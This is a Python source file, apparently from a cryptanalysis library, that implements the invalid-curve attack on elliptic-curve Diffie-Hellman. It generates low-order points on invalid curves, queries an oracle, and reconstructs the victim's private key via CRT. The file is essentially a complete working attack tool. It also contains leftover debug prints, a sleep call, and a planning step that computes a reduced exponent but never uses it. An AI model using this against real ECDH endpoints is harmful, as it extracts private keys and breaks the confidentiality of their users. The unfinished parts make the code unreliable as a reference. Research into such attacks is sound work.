from samson.math.algebra.curves.weierstrass_curve import WeierstrassCurve, WeierstrassPoint
from samson.math.algebra.curves.named import _PRECOMPUTED_ICA_PLANS, _PRECOMPUTED_ICA_ORDERS
from samson.math.algebra.rings.integer_ring import ZZ
from samson.math.general import crt, tonelli, product, lcm
from samson.math.factorization.general import factor
from samson.protocols.ecdhe import ECDHE
from samson.utilities.runtime import RUNTIME
from typing import List
import itertools

import logging
log = logging.getLogger(__name__)


class InvalidCurveAttack(object):
    """
    The Invalid Curve attack takes advantage of systems that don't validate whether the other party's public key is on the curve.
    The attacker can generate curves of smoother order with a different `b` constant, and then generate a public key
    that lies inside of a subgroup.

    There are two phases to this attack:
        1) Finding residues modulo the small factors of the group order
        2) Bruteforcing the residue configuration. (ZZ/ZZ(67))(15) may actually be (ZZ/ZZ(67))(52).

    Conditions:
    * Elliptic Curve Diffie-Hellman is being used
    * The user has access to an oracle that accepts arbitrary public keys and returns the residue
    """

    def __init__(self, oracle: 'Oracle', curve: WeierstrassCurve, threads: int=1):
        """
        Parameters:
            oracle          (Oracle): Oracle that accepts (public_key: WeierstrassPoint, factor: int) and returns (residue: int).
            curve (WeierstrassCurve): Curve that the victim is using.
        """
        self.oracle  = oracle
        self.curve   = curve
        self.threads = threads



    @RUNTIME.report
    def execute(self, public_key: WeierstrassPoint, invalid_curves: List[WeierstrassCurve]=None, max_factor_size: int=2**16) -> int:
        """
        Executes the attack.

        Parameters:
            public_key      (int): ECDH public key to crack.
            invalid_curves (list): List of invalid curves to use in the attack.
            max_factor_size (int): Max factor size to prevent attempting to factor forever.
        
        Returns:
            int: Private key.

        References:
            "Validation of Elliptic Curve Public Keys" (https://iacr.org/archive/pkc2003/25670211/25670211.pdf)
        """
        residues     = []
        factors_seen = set()
        total        = 1

        # Reaching cardinality only determines the key up to sign.
        # By getting to cardinality squared, we can get the exact key
        # without having to do a lengthy bruteforce
        reached_card = False
        cardinality  = self.curve.cardinality()**2

        if invalid_curves:
            curve_facs = [(inv_curve, [(r, e) for r, e in factor(inv_curve.cardinality(), use_rho=False, limit=max_factor_size).items() if r < max_factor_size]) for inv_curve in invalid_curves]

            # Check if we can meet the required cardinality
            max_card_achieved = 1
            for prod in [product([r**e for r,e in facs]) for _, facs in curve_facs]:
                max_card_achieved = lcm(max_card_achieved, prod)    

            if max_card_achieved < cardinality:
                raise RuntimeError(f'Maximum achievable modulus is only {"%.2f"%(max_card_achieved / cardinality)}% of curve cardinality squared. Supply more invalid curves.')


            # Plan which factors to use
            flattened = [[(inv_curve, (r,e)) for r,e in facs] for inv_curve, facs in curve_facs]
            flattened = [item for sublist in flattened for item in sublist]
            fac_dict  = {}

            for inv_curve, (r,e) in flattened:
                if r not in fac_dict:
                    fac_dict[r] = []

                fac_dict[r].append((inv_curve, e))

            planned_card = 1
            initial_plan = []

            # Add greedily
            for fac, curve_exponents in sorted(fac_dict.items(), key=lambda item: item[0]):
                selected_curve, exponent = max(curve_exponents, key=lambda item: item[1])

                # Two is a special case, and we require an exponent of at least 2.
                if fac == 2 and exponent == 1:
                    continue

                initial_plan.append((selected_curve, fac, exponent))
                planned_card *= fac**exponent


            final_plan = []


            # Remove greedily
            for curve, fac, exponent in sorted(initial_plan, key=lambda item: item[1], reverse=True):
                final_exp = exponent
                for _ in range(exponent):
                    if planned_card // fac > cardinality:
                        planned_card //= fac
                        final_exp -= 1
                    else:
                        break

                final_plan.append((curve, fac, exponent))

        else:
            try:
                final_plan = _PRECOMPUTED_ICA_PLANS[self.curve]
                orders     = _PRECOMPUTED_ICA_ORDERS[self.curve]
                inv_curves = {b: WeierstrassCurve(a=self.curve.a, b=self.curve.ring(b), cardinality=orders[b], base_tuple=(self.curve.G.x, self.curve.G.y), ring=self.curve.ring) for b in set([b for b,f,e in final_plan])}
                final_plan = [(inv_curves[b], f, e) for b,f,e in final_plan]

            except KeyError:
                raise RuntimeError('No invalid curves provided and no precomputed plan found')


        avg_requests = 0
        needed_res   = 0
        for curve, fac, exponent in final_plan:
            avg_requests += ((fac+1) // 2)*exponent
            needed_res   += exponent

        log.debug(f'Attack plan consists of {needed_res} residues and an average of oracle {avg_requests} requests')

        # Execute the attack
        @RUNTIME.threaded(threads=self.threads, starmap=True)
        def find_residues(inv_curve, fac, exponent):
            res = 0
            mal_ecdhe = ECDHE(G=self.curve.G, d=1)

            # If fac is 2, then our heuristic when generating the bad_pub will fail
            # Skip its first exponent
            for curr_e in range(1 + (fac == 2), exponent+1):
                subgroup = fac**curr_e

                # Generate a low-order point on the invalid curve
                bad_pub = inv_curve.POINT_AT_INFINITY

                while bad_pub == inv_curve.POINT_AT_INFINITY or bad_pub == inv_curve.G:
                    point   = inv_curve.random()
                    bad_pub = point * (inv_curve.cardinality() // subgroup)
                
                print(bad_pub.x, bad_pub.y)
                # Determine the residue within the subgroup
                bad_pub = bad_pub.cache_mul(bad_pub.curve.cardinality().bit_length())

                # Handle 2's skip
                step = subgroup // fac
                if fac == 2 and curr_e == 2:
                    step //= 2

                for i in range(res, subgroup+1, step):
                    mal_ecdhe.d = i
                    if fac == 2:
                        import time
                        print(i)
                        time.sleep(0.5)
                    if self.oracle.request(bad_pub, mal_ecdhe.derive_key(bad_pub)):
                        res = i
                        break

                res %= subgroup
                print(res, subgroup)
            
            return res, subgroup


        residues = find_residues(final_plan)


        res, mod      = crt(residues)
        p             = int(self.curve.ring.quotient)
        print(residues)
        print(res, mod)
        recovered_key = tonelli(int(res**2 % mod), p)

        # The square root could be negative
        if recovered_key * self.curve.G != public_key:
            recovered_key = -recovered_key % p

        return recovered_key

